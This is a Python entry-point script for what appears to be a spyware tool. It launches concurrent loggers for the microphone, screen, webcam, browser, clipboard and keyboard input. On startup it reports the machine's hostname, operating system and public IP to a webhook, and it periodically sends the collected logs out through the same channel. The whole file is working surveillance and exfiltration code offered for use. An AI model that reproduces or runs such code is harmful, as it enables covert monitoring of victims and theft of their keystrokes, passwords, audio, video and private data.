import threading
import time
import platform
import requests

from config import SEND_LOGS_INTERVAL_SEC

from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.screen_logger import ScreenLogger
from loggers.webcam_logger import WebcamLogger

from utils.file_utils import create_log_directories
from utils.logging_utils import log_error, send_logs
from utils.webhook_utils import send_message


def send_all_logs(loggers):
    while True:
        for logger in loggers:
            try:
                logger.send_logs()
            except FileNotFoundError:
                pass
            except Exception as e:
                log_error(f"Unexpected error in send_logs: {e}")
            time.sleep(1)
        send_logs()
        time.sleep(SEND_LOGS_INTERVAL_SEC)


def create_loggers():
    loggers = [
        MicrophoneLogger(),
        ScreenLogger(),
        WebcamLogger(),
        BrowserLogger(),
        ClipboardLogger(),
        InputLogger(),
    ]
    return loggers


def start_loggers(loggers):
    threads = []
    for logger in loggers:
        thread = threading.Thread(target=logger.run)
        thread.start()
        threads.append(thread)
    return threads


def startup_message():
    ip = requests.get("https://checkip.amazonaws.com").text.strip()
    system_info = platform.uname()
    message = f"Started logging on {system_info.system} {system_info.release} ({system_info.version}) from {system_info.node} at IP: {ip}"
    send_message(message)


def main():
    try:
        startup_message()
        create_log_directories()
        loggers = create_loggers()
        logger_threads = start_loggers(loggers)
        send_logs_thread = threading.Thread(target=send_all_logs, args=(loggers,))
        send_logs_thread.start()

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        for logger in loggers:
            logger.running = False

        for thread in logger_threads:
            thread.join()

        send_logs_thread.join()

    except Exception as e:
        log_error(e)
        return 1
    return 0


if __name__ == "__main__":
    exit(main())
